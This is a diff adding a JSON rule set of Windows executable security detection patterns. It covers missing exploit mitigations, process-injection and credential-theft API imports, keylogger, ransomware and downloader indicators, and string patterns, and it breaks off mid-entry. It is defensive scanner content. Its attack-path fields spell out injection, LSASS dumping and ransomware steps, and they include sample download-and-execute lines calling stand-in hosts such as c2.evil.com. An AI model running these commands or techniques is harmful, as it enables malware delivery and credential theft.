@@ -1,0 +1,822 @@
+{
+  "schema_version": "1.0.0",
+  "name": "Windows PE/EXE Security Patterns",
+  "platform": "exe",
+  "patterns": [
+
+    {
+      "id": "exe-no-aslr",
+      "title": "Missing ASLR (Address Space Layout Randomization)",
+      "severity": "High",
+      "category": "Binary Hardening",
+      "enabled": true,
+      "description": "The binary is not compiled with ASLR (/DYNAMICBASE). Without ASLR, the executable and its DLLs load at predictable base addresses, making exploitation of memory corruption bugs (buffer overflows, use-after-free) significantly easier.",
+      "attack_path": "Attacker builds a ROP chain using hardcoded absolute addresses. Without ASLR, gadgets and data structures are at the same address every run, enabling reliable exploitation across targets.",
+      "remediation": "Compile with /DYNAMICBASE flag (enabled by default in Visual Studio 2010+). Verify with: dumpbin /headers binary.exe | findstr DLL",
+      "cwe": ["CWE-119"],
+      "references": ["https://docs.microsoft.com/en-us/cpp/build/reference/dynamicbase"],
+      "tags": ["aslr", "binary-hardening", "exploit-mitigation"],
+      "detection": {
+        "type": "pe_characteristic",
+        "flag": "ASLR",
+        "check": "missing"
+      }
+    },
+
+    {
+      "id": "exe-no-dep",
+      "title": "Missing DEP/NX (Data Execution Prevention)",
+      "severity": "High",
+      "category": "Binary Hardening",
+      "enabled": true,
+      "description": "The binary is not compiled with DEP/NX (/NXCOMPAT). Without DEP, attackers can place shellcode on the stack or heap and execute it directly — the most basic form of exploitation.",
+      "attack_path": "Attacker places shellcode in a stack buffer or heap allocation. Without DEP, the CPU executes data as code, giving the attacker arbitrary code execution.",
+      "remediation": "Compile with /NXCOMPAT flag. For 32-bit applications, also opt into DEP via SetProcessDEPPolicy(). Verify with: dumpbin /headers binary.exe | findstr NX",
+      "cwe": ["CWE-119"],
+      "references": ["https://docs.microsoft.com/en-us/cpp/build/reference/nxcompat-compatible-with-data-execution-prevention"],
+      "tags": ["dep", "nx", "binary-hardening", "exploit-mitigation"],
+      "detection": {
+        "type": "pe_characteristic",
+        "flag": "DEP_NX",
+        "check": "missing"
+      }
+    },
+
+    {
+      "id": "exe-no-cfg",
+      "title": "Missing Control Flow Guard (CFG)",
+      "severity": "Medium",
+      "category": "Binary Hardening",
+      "enabled": true,
+      "description": "The binary is not compiled with Control Flow Guard (/guard:cf). CFG prevents attackers from redirecting execution to arbitrary memory locations via corrupted function pointers or vtables.",
+      "attack_path": "Attacker corrupts a function pointer or C++ vtable via a heap overflow. Without CFG, execution is redirected to an attacker-controlled address (e.g., a ROP gadget or shellcode stub).",
+      "remediation": "Compile with /guard:cf (Visual Studio 2015+). Run on Windows 8.1+ which enforces CFG at the kernel level.",
+      "cwe": ["CWE-119"],
+      "references": ["https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard"],
+      "tags": ["cfg", "binary-hardening", "exploit-mitigation"],
+      "detection": {
+        "type": "pe_characteristic",
+        "flag": "CFG",
+        "check": "missing"
+      }
+    },
+
+    {
+      "id": "exe-no-stack-cookie",
+      "title": "Missing Stack Buffer Security Cookie (/GS)",
+      "severity": "High",
+      "category": "Binary Hardening",
+      "enabled": true,
+      "description": "No stack security cookie (__security_cookie) was detected. The /GS compiler flag places a random value before the saved return address; a mismatch triggers a security exception before the overwritten return address is used.",
+      "attack_path": "Attacker exploits a stack buffer overflow to overwrite the return address. Without a stack cookie, the overwrite is not detected and the corrupted return address is executed.",
+      "remediation": "Ensure /GS is enabled (default in MSVC). Do not disable it with #pragma strict_gs_check(off). Verify SecurityCookie in LoadConfig directory.",
+      "cwe": ["CWE-121"],
+      "references": ["https://docs.microsoft.com/en-us/cpp/build/reference/gs-buffer-security-check"],
+      "tags": ["stack-cookie", "gs", "buffer-overflow", "binary-hardening"],
+      "detection": {
+        "type": "pe_characteristic",
+        "flag": "STACK_COOKIE",
+        "check": "missing"
+      }
+    },
+
+    {
+      "id": "exe-no-high-entropy-aslr",
+      "title": "Missing High Entropy ASLR (64-bit)",
+      "severity": "Medium",
+      "category": "Binary Hardening",
+      "enabled": true,
+      "description": "This 64-bit binary does not set the HIGH_ENTROPY_VA flag (/HIGHENTROPYVA), limiting ASLR randomization to 8 bits. Full 64-bit ASLR uses 19–48 bits of entropy, making brute-force attempts infeasible.",
+      "attack_path": "Low-entropy ASLR can be brute-forced in some scenarios (heap spraying, info-leak + spray). 64-bit binaries without HIGHENTROPYVA leave significant attack surface.",
+      "remediation": "Compile 64-bit binaries with /HIGHENTROPYVA (Visual Studio 2012+). This flag works only for 64-bit images with ASLR also enabled.",
+      "cwe": ["CWE-330"],
+      "references": ["https://docs.microsoft.com/en-us/cpp/build/reference/highentropyva-support-64-bit-aslr"],
+      "tags": ["aslr", "high-entropy", "binary-hardening"],
+      "detection": {
+        "type": "pe_characteristic",
+        "flag": "HIGH_ENTROPY_ASLR",
+        "check": "missing"
+      }
+    },
+
+    {
+      "id": "exe-no-authenticode",
+      "title": "Missing Authenticode Signature",
+      "severity": "Medium",
+      "category": "Binary Hardening",
+      "enabled": true,
+      "description": "The binary is not Authenticode-signed. Unsigned executables cannot be verified for integrity or publisher identity. Users receive an 'Unknown Publisher' SmartScreen warning, and code integrity policies may block execution.",
+      "attack_path": "Attacker tampers with the binary (inserting backdoor code) without invalidating a signature. Supply chain or delivery-path compromise goes undetected.",
+      "remediation": "Sign executables with a code signing certificate from a trusted CA. Use signtool.exe sign /fd sha256 /tr http://timestamp.digicert.com /td sha256.",
+      "cwe": ["CWE-345"],
+      "references": ["https://docs.microsoft.com/en-us/windows/win32/seccrypto/authenticode"],
+      "tags": ["authenticode", "code-signing", "supply-chain"],
+      "detection": {
+        "type": "pe_characteristic",
+        "flag": "AUTHENTICODE",
+        "check": "missing"
+      }
+    },
+
+    {
+      "id": "exe-admin-manifest",
+      "title": "Manifest Requests Administrator Elevation",
+      "severity": "Medium",
+      "category": "Binary Hardening",
+      "enabled": true,
+      "description": "The application manifest sets requestedExecutionLevel=requireAdministrator. The process always demands UAC elevation at launch. This maximizes the blast radius of any vulnerability exploited in this process.",
+      "attack_path": "Any code execution vulnerability in an elevated process gives the attacker SYSTEM-level capabilities. Privilege escalation step is bypassed — exploitation directly yields admin.",
+      "remediation": "Request only the privilege level actually needed. Prefer asInvoker and elevate specific operations programmatically. Avoid blanket requireAdministrator.",
+      "cwe": ["CWE-250"],
+      "references": ["https://docs.microsoft.com/en-us/windows/win32/sbscs/application-manifests"],
+      "tags": ["uac", "elevation", "manifest", "privilege"],
+      "detection": {
+        "type": "pe_manifest",
+        "check": "admin"
+      }
+    },
+
+    {
+      "id": "exe-uiaccess-true",
+      "title": "Manifest Sets uiAccess=true (UI Privilege Bypass)",
+      "severity": "High",
+      "category": "Binary Hardening",
+      "enabled": true,
+      "description": "The manifest sets uiAccess=true, granting the process the ability to send input to higher-privilege windows (UIPI bypass). This enables driving the UI of elevated applications, which is a significant privilege escalation vector.",
+      "attack_path": "Attacker exploits the application or runs it with uiAccess=true to inject keystrokes or mouse events into UAC dialogs or admin-level UI, bypassing UAC confirmation.",
+      "remediation": "Only set uiAccess=true for accessibility software that genuinely needs it. The binary must be Authenticode-signed and installed in a trusted location (Program Files) for this to work — unsigned binaries should never set this.",
+      "cwe": ["CWE-264"],
+      "references": ["https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-overview"],
+      "tags": ["uiaccess", "uipi-bypass", "privilege-escalation", "manifest"],
+      "detection": {
+        "type": "pe_manifest",
+        "check": "uiaccess"
+      }
+    },
+
+    {
+      "id": "exe-rwx-section",
+      "title": "Read+Write+Execute (RWX) Section",
+      "severity": "Critical",
+      "category": "Section Security",
+      "enabled": true,
+      "description": "One or more PE sections are simultaneously readable, writable, and executable. Legitimate code sections are read+execute (not writable). RWX sections are a classic indicator of packers, injectors, or shellcode stubs that decrypt and execute code at runtime.",
+      "attack_path": "Packed malware decompresses shellcode into an RWX section at runtime. An attacker exploiting a vulnerability can write shellcode to this section and redirect execution to it, bypassing DEP.",
+      "remediation": "Never produce RWX sections. Separate code (.text) from data (.data). Investigate any legitimate need for writable+executable memory and use VirtualProtect to flip to RX after writing.",
+      "cwe": ["CWE-264"],
+      "references": [],
+      "tags": ["rwx", "section", "packer", "shellcode"],
+      "detection": {
+        "type": "pe_section",
+        "check": "rwx"
+      }
+    },
+
+    {
+      "id": "exe-high-entropy-section",
+      "title": "High Entropy Section (Packed / Encrypted Code)",
+      "severity": "High",
+      "category": "Section Security",
+      "enabled": true,
+      "description": "One or more PE sections have Shannon entropy > 7.0. Normal code/data has entropy 4.0–6.5. Entropy above 7.0 indicates compressed, encrypted, or shellcode content — the hallmark of packed executables and encrypted payloads.",
+      "attack_path": "Packed malware evades signature-based detection. At runtime the packer stub decrypts/decompresses the real malicious payload and transfers execution to it. High-entropy sections make static analysis and AV scanning ineffective.",
+      "remediation": "Investigate all high-entropy sections. If legitimately encrypted resources are needed, isolate them in .rsrc. Run through an unpacker (UPX, MPRESS). If this is third-party code, verify its provenance.",
+      "cwe": ["CWE-311"],
+      "references": ["https://cocomelonc.github.io/malware/2022/11/05/malware-analysis-6.html"],
+      "tags": ["packer", "encryption", "entropy", "obfuscation"],
+      "detection": {
+        "type": "pe_section",
+        "check": "high_entropy"
+      }
+    },
+
+    {
+      "id": "exe-packer-section-name",
+      "title": "Known Packer Section Name Detected",
+      "severity": "High",
+      "category": "Section Security",
+      "enabled": true,
+      "description": "The binary contains a section with a name associated with known packers (UPX, ASPack, PECompact, MPRESS, Themida, WinLicense). Packed binaries hide their true content and behavior until runtime unpacking occurs.",
+      "attack_path": "Malware authors use packers to bypass AV detection, hide import tables, and obfuscate functionality. Packed malware is significantly harder to analyze statically.",
+      "remediation": "Unpack the binary using the appropriate unpacker. Investigate whether packing is necessary for the business purpose. Packers are rarely justified for legitimate software.",
+      "cwe": ["CWE-311"],
+      "references": [],
+      "tags": ["upx", "packer", "themida", "aspack", "obfuscation"],
+      "detection": {
+        "type": "pe_section",
+        "check": "packer_name"
+      }
+    },
+
+    {
+      "id": "exe-process-injection-triad",
+      "title": "Classic Process Injection API Triad",
+      "severity": "Critical",
+      "category": "Process Injection",
+      "enabled": true,
+      "description": "The binary imports VirtualAllocEx, WriteProcessMemory, AND CreateRemoteThread — the three APIs that together form the textbook process injection sequence. This combination allocates memory in a remote process, writes shellcode, and executes it.",
+      "attack_path": "1. OpenProcess() → get handle to target. 2. VirtualAllocEx() → allocate RWX memory in target. 3. WriteProcessMemory() → copy shellcode. 4. CreateRemoteThread() → execute shellcode in target process. This injects malicious code into legitimate processes (svchost, explorer) to evade detection.",
+      "remediation": "Legitimate uses are rare (debuggers, profilers). Verify all three APIs are necessary. Implement application allowlisting. Monitor for this combination via ETW/Sysmon Event ID 8 (CreateRemoteThread).",
+      "cwe": ["CWE-114"],
+      "references": ["https://attack.mitre.org/techniques/T1055/"],
+      "tags": ["process-injection", "virtualalloc", "writeprocessmemory", "createremotethread", "mitre-t1055"],
+      "detection": {
+        "type": "pe_imports_combo",
+        "apis": ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"],
+        "min_matches": 3
+      }
+    },
+
+    {
+      "id": "exe-process-injection-apis",
+      "title": "Process Injection / Hollowing APIs",
+      "severity": "High",
+      "category": "Process Injection",
+      "enabled": true,
+      "description": "The binary imports APIs commonly used for process injection or process hollowing (NtUnmapViewOfSection, QueueUserAPC, NtCreateThreadEx, RtlCreateUserThread, SetThreadContext). These low-level APIs are rarely used by legitimate applications.",
+      "attack_path": "Process hollowing: spawn suspended process, unmap its memory with NtUnmapViewOfSection, write malicious code, resume. APC injection: QueueUserAPC to a thread in the target process. These techniques run code in the context of legitimate processes.",
+      "remediation": "Whitelist legitimate uses of these APIs (must be a debugger, profiler, or security tool). Monitor via Sysmon. Implement application control policies.",
+      "cwe": ["CWE-114"],
+      "references": ["https://attack.mitre.org/techniques/T1055/012/"],
+      "tags": ["process-hollowing", "apc-injection", "ntunmap", "thread-hijacking"],
+      "detection": {
+        "type": "pe_imports",
+        "apis": ["NtUnmapViewOfSection", "ZwUnmapViewOfSection", "QueueUserAPC", "NtCreateThreadEx", "RtlCreateUserThread", "SetThreadContext"],
+        "match": "any"
+      }
+    },
+
+    {
+      "id": "exe-open-process",
+      "title": "OpenProcess — Remote Process Access",
+      "severity": "Medium",
+      "category": "Process Injection",
+      "enabled": true,
+      "description": "The binary calls OpenProcess, which obtains a handle to another process. Combined with memory read/write APIs, this enables code injection, memory scanning, or credential theft from other processes.",
+      "attack_path": "OpenProcess(PROCESS_ALL_ACCESS, ..., lsass_pid) is the first step in credential dumping (mimikatz-style LSASS access). Combined with ReadProcessMemory, it extracts password hashes from LSASS memory.",
+      "remediation": "Audit all OpenProcess calls. Restrict requested access rights to the minimum needed. For cross-process operations, consider using secure IPC mechanisms instead.",
+      "cwe": ["CWE-284"],
+      "references": [],
+      "tags": ["openprocess", "cross-process", "credential-access"],
+      "detection": {
+        "type": "pe_imports",
+        "apis": ["OpenProcess"],
+        "match": "any"
+      }
+    },
+
+    {
+      "id": "exe-persistence-service",
+      "title": "Windows Service Installation APIs",
+      "severity": "High",
+      "category": "Persistence",
+      "enabled": true,
+      "description": "The binary imports CreateService or ChangeServiceConfig, enabling it to install or modify Windows services. Services start automatically at boot, providing persistence that survives reboots and runs as SYSTEM by default.",
+      "attack_path": "Attacker calls CreateServiceA(SC_MANAGER_ALL_ACCESS, ..., SERVICE_AUTO_START) to install a malicious service that starts at boot as SYSTEM, providing persistent elevated access.",
+      "remediation": "Service installation is legitimate for installers. Monitor new service creation via Sysmon Event ID 6 / Windows Event 7045. Alert on new services from unexpected directories.",
+      "cwe": ["CWE-284"],
+      "references": ["https://attack.mitre.org/techniques/T1543/003/"],
+      "tags": ["persistence", "service", "boot-persistence", "mitre-t1543"],
+      "detection": {
+        "type": "pe_imports",
+        "apis": ["CreateServiceA", "CreateServiceW", "ChangeServiceConfigA", "ChangeServiceConfigW"],
+        "match": "any"
+      }
+    },
+
+    {
+      "id": "exe-persistence-registry",
+      "title": "Registry Write APIs (Potential Persistence)",
+      "severity": "Medium",
+      "category": "Persistence",
+      "enabled": true,
+      "description": "The binary imports registry write APIs (RegSetValueEx, RegCreateKeyEx). Combined with Run key path strings (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run), this indicates registry-based persistence.",
+      "attack_path": "Attacker calls RegSetValueExA(HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', ...) to execute a malicious payload on every user login.",
+      "remediation": "Monitor registry writes to Run/RunOnce keys via Sysmon Event ID 13. Restrict applications from writing to autostart registry keys.",
+      "cwe": ["CWE-284"],
+      "references": ["https://attack.mitre.org/techniques/T1547/001/"],
+      "tags": ["persistence", "registry", "run-key", "mitre-t1547"],
+      "detection": {
+        "type": "pe_imports",
+        "apis": ["RegSetValueExA", "RegSetValueExW", "RegCreateKeyExA", "RegCreateKeyExW"],
+        "match": "any"
+      }
+    },
+
+    {
+      "id": "exe-privilege-escalation-token",
+      "title": "Token Manipulation APIs (Privilege Escalation)",
+      "severity": "High",
+      "category": "Privilege Escalation",
+      "enabled": true,
+      "description": "The binary imports AdjustTokenPrivileges and/or DuplicateTokenEx. These APIs enable enabling disabled privileges (e.g., SeDebugPrivilege) and cloning tokens for impersonation — the core of many local privilege escalation techniques.",
+      "attack_path": "1. OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, ...) 2. AdjustTokenPrivileges(..., SeDebugPrivilege, SE_PRIVILEGE_ENABLED) — this enables debugging any process. 3. OpenProcess(target_pid) with full access to LSASS or other privileged processes.",
+      "remediation": "Token manipulation is rarely needed. If required, use LeastPrivilege tokens. Monitor SeDebugPrivilege enablement via Windows Event 4703.",
+      "cwe": ["CWE-269"],
+      "references": ["https://attack.mitre.org/techniques/T1134/"],
+      "tags": ["privilege-escalation", "token-manipulation", "sedebug", "mitre-t1134"],
+      "detection": {
+        "type": "pe_imports",
+        "apis": ["AdjustTokenPrivileges", "DuplicateTokenEx", "ImpersonateLoggedOnUser", "CreateProcessWithTokenW"],
+        "match": "any"
+      }
+    },
+
+    {
+      "id": "exe-anti-debug-basic",
+      "title": "Anti-Debugging / Anti-Analysis APIs",
+      "severity": "High",
+      "category": "Anti-Analysis",
+      "enabled": true,
+      "description": "The binary imports debugger detection APIs (IsDebuggerPresent, CheckRemoteDebuggerPresent). Anti-debug techniques indicate the binary deliberately tries to hinder security analysis — a strong malware indicator in non-debugger/profiler software.",
+      "attack_path": "Malware checks IsDebuggerPresent() at startup. If a debugger is detected, it takes a benign code path or terminates. This makes dynamic analysis much harder, allowing real malicious behavior to evade sandbox detection.",
+      "remediation": "Legitimate software should not check for debuggers. Remove anti-debug code. If present in third-party libraries, investigate their use. Anti-debug code in production software is a security code smell.",
+      "cwe": ["CWE-693"],
+      "references": ["https://anti-debug.checkpoint.com/techniques/debug-flags.html"],
+      "tags": ["anti-debug", "anti-analysis", "evasion", "malware-indicator"],
+      "detection": {
+        "type": "pe_imports",
+        "apis": ["IsDebuggerPresent", "CheckRemoteDebuggerPresent", "NtQueryInformationProcess"],
+        "match": "any"
+      }
+    },
+
+    {
+      "id": "exe-anti-debug-timing",
+      "title": "Timing-Based Anti-Analysis / VM Detection",
+      "severity": "Medium",
+      "category": "Anti-Analysis",
+      "enabled": true,
+      "description": "The binary uses high-resolution timing APIs (QueryPerformanceCounter, GetTickCount64) which can be used for timing attacks — detecting single-stepping in debuggers or virtualization overhead in sandboxes.",
+      "attack_path": "Malware records timestamp before and after a NOP sled. If elapsed time exceeds expected CPU speed (due to single-stepping or VM slowness), it infers analysis and terminates or behaves differently.",
+      "remediation": "Timing API usage is common in legitimate code. Flag this finding only in conjunction with other malware indicators. Monitor for sandbox evasion.",
+      "cwe": ["CWE-693"],
+      "references": [],
+      "tags": ["timing-attack", "vm-detection", "anti-sandbox", "anti-debug"],
+      "detection": {
+        "type": "pe_imports",
+        "apis": ["QueryPerformanceCounter", "GetTickCount64", "NtQuerySystemInformation"],
+        "match": "any"
+      }
+    },
+
+    {
+      "id": "exe-keylogger-hook",
+      "title": "Global Keyboard Hook (Keylogger)",
+      "severity": "Critical",
+      "category": "Keylogging / Spyware",
+      "enabled": true,
+      "description": "The binary imports SetWindowsHookEx, the primary API for installing a global keyboard hook. When used with WH_KEYBOARD_LL (low-level keyboard hook), it captures all keystrokes system-wide, including in password fields and other applications.",
+      "attack_path": "SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, NULL, 0) installs a system-wide keyboard hook. All keystrokes (including passwords, credit card numbers, messages) are passed to hookProc before the target application receives them.",
+      "remediation": "SetWindowsHookEx is legitimate for accessibility tools and input method editors. Investigate the hook type installed (WH_KEYBOARD, WH_KEYBOARD_LL, WH_MOUSE). Alert on WH_KEYBOARD_LL in non-accessibility software.",
+      "cwe": ["CWE-200"],
+      "references": ["https://attack.mitre.org/techniques/T1056/001/"],
+      "tags": ["keylogger", "hook", "setkeyboardhook", "spyware", "mitre-t1056"],
+      "detection": {
+        "type": "pe_imports",
+        "apis": ["SetWindowsHookExA", "SetWindowsHookExW"],
+        "match": "any"
+      }
+    },
+
+    {
+      "id": "exe-keylogger-async",
+      "title": "Asynchronous Key State Polling (Keylogger Pattern)",
+      "severity": "High",
+      "category": "Keylogging / Spyware",
+      "enabled": true,
+      "description": "The binary imports GetAsyncKeyState, which polls the state of any key without the user's focus being on the calling application. This is the simplest keylogger implementation — repeatedly polling all 256 virtual keys.",
+      "attack_path": "A loop calling GetAsyncKeyState(vk) for all 256 virtual keys captures all keystrokes from any application, including passwords typed in other windows.",
+      "remediation": "Legitimate uses include game input handling when the application has focus. Combined with a loop over all virtual keys in a background thread, this is a keylogger pattern.",
+      "cwe": ["CWE-200"],
+      "references": ["https://attack.mitre.org/techniques/T1056/001/"],
+      "tags": ["keylogger", "getasynckeystate", "spyware"],
+      "detection": {
+        "type": "pe_imports",
+        "apis": ["GetAsyncKeyState"],
+        "match": "any"
+      }
+    },
+
+    {
+      "id": "exe-credential-dump-lsass",
+      "title": "LSASS Memory Dump API (Credential Theft)",
+      "severity": "Critical",
+      "category": "Credential Theft",
+      "enabled": true,
+      "description": "The binary imports MiniDumpWriteDump (dbghelp.dll), which is the API used by tools like mimikatz, procdump, and Task Manager to dump process memory. When targeting LSASS, this extracts plaintext credentials, NTLM hashes, and Kerberos tickets.",
+      "attack_path": "1. OpenProcess(PROCESS_ALL_ACCESS, lsass_pid) 2. MiniDumpWriteDump(lsass_handle, ..., dumpFile) creates LSASS.dmp. 3. Offline parsing extracts NTLM hashes for pass-the-hash or password cracking.",
+      "remediation": "Protect LSASS with PPL (Protected Process Light). Enable Credential Guard. Monitor MiniDumpWriteDump calls targeting lsass.exe via ETW/Sysmon. Restrict who can call OpenProcess on LSASS.",
+      "cwe": ["CWE-522"],
+      "references": ["https://attack.mitre.org/techniques/T1003/001/"],
+      "tags": ["credential-dump", "lsass", "minidump", "mimikatz", "mitre-t1003"],
+      "detection": {
+        "type": "pe_imports",
+        "apis": ["MiniDumpWriteDump"],
+        "match": "any"
+      }
+    },
+
+    {
+      "id": "exe-credential-dpapi",
+      "title": "DPAPI Decryption (Credential Extraction)",
+      "severity": "High",
+      "category": "Credential Theft",
+      "enabled": true,
+      "description": "The binary imports CryptUnprotectData (DPAPI). DPAPI is used by Windows to encrypt browser-saved passwords, Windows credentials, and certificates. CryptUnprotectData called under the victim's user context decrypts all DPAPI-protected secrets.",
+      "attack_path": "Attacker runs code as the victim user, calls CryptUnprotectData on Chrome/Edge browser vault files to extract saved passwords in plaintext — no LSASS access required.",
+      "remediation": "CryptUnprotectData is used by many legitimate applications. Flag in combination with file system access to browser profile directories (%LOCALAPPDATA%\\Google\\Chrome\\User Data).",
+      "cwe": ["CWE-522"],
+      "references": ["https://attack.mitre.org/techniques/T1555/003/"],
+      "tags": ["dpapi", "credential-theft", "browser-passwords", "mitre-t1555"],
+      "detection": {
+        "type": "pe_imports",
+        "apis": ["CryptUnprotectData"],
+        "match": "any"
+      }
+    },
+
+    {
+      "id": "exe-credential-cred-api",
+      "title": "Windows Credential Manager Access APIs",
+      "severity": "High",
+      "category": "Credential Theft",
+      "enabled": true,
+      "description": "The binary imports CredRead or CredEnumerate (advapi32.dll), enabling it to read all passwords stored in Windows Credential Manager — including RDP credentials, network drive passwords, and application secrets.",
+      "attack_path": "CredEnumerate(NULL, 0, &count, &pCreds) returns all stored credentials in the Credential Manager vault, including plaintext passwords for VPN, RDP, and mapped drives.",
+      "remediation": "Credential Manager access is rare in legitimate applications. Monitor CredRead/CredEnumerate API calls. Consider Credential Guard to harden the credential store.",
+      "cwe": ["CWE-522"],
+      "references": ["https://attack.mitre.org/techniques/T1555/004/"],
+      "tags": ["credential-manager", "credread", "credential-theft", "mitre-t1555"],
+      "detection": {
+        "type": "pe_imports",
+        "apis": ["CredReadA", "CredReadW", "CredEnumerateA", "CredEnumerateW"],
+        "match": "any"
+      }
+    },
+
+    {
+      "id": "exe-ransomware-api-combo",
+      "title": "Ransomware API Combination (Encrypt + Enumerate Files)",
+      "severity": "Critical",
+      "category": "Ransomware",
+      "enabled": true,
+      "description": "The binary imports a combination of file encryption APIs (CryptEncrypt/BCryptEncrypt) along with file enumeration (FindFirstFile) and file manipulation (MoveFileEx/DeleteFile). This pattern is characteristic of ransomware — enumerating, encrypting, and renaming/deleting original files.",
+      "attack_path": "1. BCryptGenRandom() → generate AES key. 2. FindFirstFile/FindNextFile → enumerate all user files. 3. BCryptEncrypt() → encrypt each file. 4. MoveFileEx() → rename to .locked/.encrypted. 5. DeleteFile() → remove shadow copies. 6. Drop ransom note.",
+      "remediation": "This API combination is almost never legitimate. Investigate immediately. Implement ransomware honeypot files (canary files). Enable VSS snapshots and Controlled Folder Access in Windows Defender.",
+      "cwe": ["CWE-327"],
+      "references": ["https://attack.mitre.org/techniques/T1486/"],
+      "tags": ["ransomware", "encryption", "file-enumeration", "mitre-t1486"],
+      "detection": {
+        "type": "pe_imports_combo",
+        "apis": ["CryptEncrypt", "BCryptEncrypt", "FindFirstFileA", "FindFirstFileW", "MoveFileExA", "MoveFileExW", "DeleteFileA", "DeleteFileW", "BCryptGenRandom"],
+        "min_matches": 4
+      }
+    },
+
+    {
+      "id": "exe-downloader-apis",
+      "title": "File Download APIs (Dropper/Downloader Indicator)",
+      "severity": "High",
+      "category": "Network",
+      "enabled": true,
+      "description": "The binary imports URLDownloadToFile or URLDownloadToCacheFile (urlmon.dll). These APIs download a file from a URL to disk with a single call — the simplest dropper API. Combined with ShellExecute, this is a complete one-stage dropper.",
+      "attack_path": "URLDownloadToFileA(NULL, 'http://c2.evil.com/payload.exe', 'C:\\Temp\\svchost32.exe', 0, NULL) followed by ShellExecuteA('C:\\Temp\\svchost32.exe') downloads and executes a second-stage payload.",
+      "remediation": "Monitor URLDownloadToFile calls and their destination paths. Block downloads to %TEMP% and user-writable directories. Investigate any binary using this API that is not an installer.",
+      "cwe": ["CWE-494"],
+      "references": ["https://attack.mitre.org/techniques/T1105/"],
+      "tags": ["downloader", "dropper", "urldownloadtofile", "mitre-t1105"],
+      "detection": {
+        "type": "pe_imports",
+        "apis": ["URLDownloadToFileA", "URLDownloadToFileW", "URLDownloadToCacheFileA", "URLDownloadToCacheFileW"],
+        "match": "any"
+      }
+    },
+
+    {
+      "id": "exe-raw-socket",
+      "title": "Raw Socket Communication (WSA / Winsock)",
+      "severity": "Low",
+      "category": "Network",
+      "enabled": true,
+      "description": "The binary uses Winsock APIs (WSAStartup, connect, send, recv) for network communication. While common in legitimate software, these APIs combined with hardcoded IP addresses or domains are typical C2 beacon indicators.",
+      "attack_path": "Malware uses WSAStartup + connect + send/recv to implement a custom C2 protocol over raw TCP, evading higher-level HTTP-based monitoring.",
+      "remediation": "Review all network destinations. Ensure connections go only to expected servers. Implement application-level firewall rules. Monitor for connections to unusual ports or IP ranges.",
+      "cwe": ["CWE-319"],
+      "references": [],
+      "tags": ["socket", "network", "c2", "winsock"],
+      "detection": {
+        "type": "pe_imports",
+        "apis": ["WSAStartup", "connect", "send", "recv"],
+        "match": "any"
+      }
+    },
+
+    {
+      "id": "exe-string-powershell-encoded",
+      "title": "PowerShell EncodedCommand in Strings",
+      "severity": "Critical",
+      "category": "String IOCs",
+      "enabled": true,
+      "description": "A PowerShell -EncodedCommand argument is present in the binary's strings. Encoded commands are Base64-encoded PowerShell that cannot be read without decoding, used to obfuscate malicious scripts from basic string scanning.",
+      "attack_path": "The binary executes powershell.exe -EncodedCommand <base64> which decodes and runs arbitrary PowerShell — downloading payloads, disabling AV, executing shellcode, or moving laterally.",
+      "remediation": "Decode the base64 string and analyze the script. Enable PowerShell Script Block Logging (Event 4104) and Module Logging. PowerShell Constrained Language Mode prevents many attack techniques.",
+      "cwe": ["CWE-78"],
+      "references": ["https://unit42.paloaltonetworks.com/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/"],
+      "tags": ["powershell", "encoded-command", "obfuscation", "living-off-the-land"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "(?:powershell|pwsh)[^\\n]{0,30}-[Ee][Nn][Cc](?:[Oo][Dd][Ee][Dd])?[Cc](?:[Oo][Mm])?|[A-Za-z0-9+/=]{80,}[A-Za-z0-9+/=]{4}"
+      }
+    },
+
+    {
+      "id": "exe-string-powershell-download",
+      "title": "PowerShell Download Cradle in Strings",
+      "severity": "Critical",
+      "category": "String IOCs",
+      "enabled": true,
+      "description": "The binary contains PowerShell download cradle strings (IEX, Invoke-Expression, DownloadString, Invoke-WebRequest). These are used to download and execute remote scripts from memory without writing to disk — fileless malware technique.",
+      "attack_path": "IEX(New-Object Net.WebClient).DownloadString('http://c2/stage2.ps1') downloads and immediately executes a script in memory, leaving no file on disk for AV to scan.",
+      "remediation": "Implement AMSI (Antimalware Scan Interface) scanning for in-memory PowerShell. Enable PowerShell Script Block Logging. Use AppLocker/WDAC to block untrusted PowerShell execution.",
+      "cwe": ["CWE-494"],
+      "references": [],
+      "tags": ["powershell", "download-cradle", "fileless", "memory-execution"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "(?i)(?:iex|invoke-expression|invoke-webrequest|downloadstring|downloadfile|net\\.webclient)"
+      }
+    },
+
+    {
+      "id": "exe-string-cmd-execution",
+      "title": "CMD.EXE Execution String",
+      "severity": "High",
+      "category": "String IOCs",
+      "enabled": true,
+      "description": "A cmd.exe /c execution pattern is present in the binary's strings. This is used to spawn command shell processes and execute arbitrary commands, often combined with obfuscated commands or LOLBins.",
+      "attack_path": "cmd.exe /c 'certutil -decode encoded.txt payload.exe && payload.exe' uses a legitimate Windows tool (certutil) to decode and run a payload, bypassing application whitelisting.",
+      "remediation": "Audit all cmd.exe spawning. Use ProcessCreationFlags to restrict child process creation. Monitor cmd.exe /c invocations with unusual arguments via Sysmon Event ID 1.",
+      "cwe": ["CWE-78"],
+      "references": [],
+      "tags": ["cmd", "command-execution", "lolbin"],
+      "detection": {
+        "type": "string_pattern",
+        "pattern": "cmd(?:\\.exe)?\\s+/[cCkK]\\s+.{5,}"
+      }
+    },
+
+    {
+      "id": "exe-string-mshta-wscript",
+      "title": "MSHTA / WScript / CScript Execution",
+      "severity": "High",
+      "category": "String IOCs",
+      "enabled": true,
+      "description": "Strings reference mshta.exe, wscript.exe, or cscript.exe — scripting hosts commonly abused for LOLBin (Living off the Land Binary) attacks. MSHTA executes HTA applications and can run arbitrary VBScript/JScript remotely.",
+      "attack_path": "mshta.exe http://c2/payload.hta downloads and executes an HTA file in memory. wscript.exe shell.vbs runs a VBScript dropper that downloads the next stage. These bypass application whitelisting that trusts system tools.",
+      "remediation": "Block mshta.exe execution via AppLocker/WDAC unless explicitly required. Monitor wscript/cscript executions with network activity.",
+      "cwe": ["CWE-78"],
+      "references": [],
